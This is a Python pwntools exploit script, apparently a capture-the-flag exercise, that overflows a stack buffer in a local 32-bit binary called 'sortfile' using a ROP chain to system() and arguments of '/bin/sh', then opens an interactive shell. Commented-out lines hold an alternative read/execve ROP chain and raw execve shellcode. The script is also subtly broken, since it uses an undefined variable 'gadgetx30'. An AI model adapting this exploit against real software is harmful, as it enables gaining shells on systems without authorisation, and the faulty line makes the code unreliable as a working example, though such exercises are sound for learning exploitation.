#!/usr/bin/env python
from pwn import *
import os


context(arch='i386', os='linux')



# execve = p32(0x8048410)
# read = p32(0x80483b0)
# buf = p32(0x0804a038)
# pop3ret = p32(0x804864d)

# print p.recvline()

# #p.sendline('A'*(0x58+4) + read + system + p32(0) + buf + p32(10))

# explt = 'A'*(0x6c+4)
# explt += read + pop3ret + p32(0) + buf + p32(10)
# explt += execve + 'AAAA' + buf + p32(0) + p32(0)
# p.sendline(explt)
# p.sendline('/bin/sh\0')
# p.interactive()
# exploit   = "\x31\xc0\x50\x68\x2f\x2f\x73" \
#           + "\x68\x68\x2f\x62\x69\x6e\x89"	\
#           + "\xe3\x89\xc1\x89\xc2\xb0\x0b"	\
#           + "\xcd\x80\x31\xc0\x40\xcd\x80"




# ebp + 0x40 + ?; main arg3
# ebp + 0x3c + ?; main arg2
# ebp + 0x38 + ?; main arg1
# ebp + 0x34 + ?; min nargs
# ebp + 0x30 + ?; main return addr ; 
# ebp + 0x2c + ?; main ebp
# ... Some unknown amount due to alignment. up to 0x10
# ebp + 0x2c	; last local variable from main.
# ebp + 0xc 	; local variable from main
# ebp + 8		; arg 1 ; gadgetx30
# ebp + 4  		; gadget 1 ;ret address
# ebp 			; garbage
# ...
# ebp - 0x1008 	; Char buffer to overflow



exploit = "/bin/sh"

filler = "".rjust(0x100C,"\0")
gadget1 = p32(0x080489c0)
system = p32(0x08048480)
pop30 = gadgetx30 + "A"*0x2c

data = filler + gadget1*0x34  + system

with open("file.in", "w") as f:
	f.write(data)





# Start the program as a subprocess
# so we can communicate with it
# Extra because of memory alignment in main.
inputlist = ['./sortfile']
inputlist.extend([exploit]*0x10)
p = process(inputlist)

# Optional: attach GDB to the process and run some GDB commands
# gdb.attach(p, '''
#    b *08048825
# ''')
# print p.recvline()
# print p.recvline()
p.interactive()

p.close()
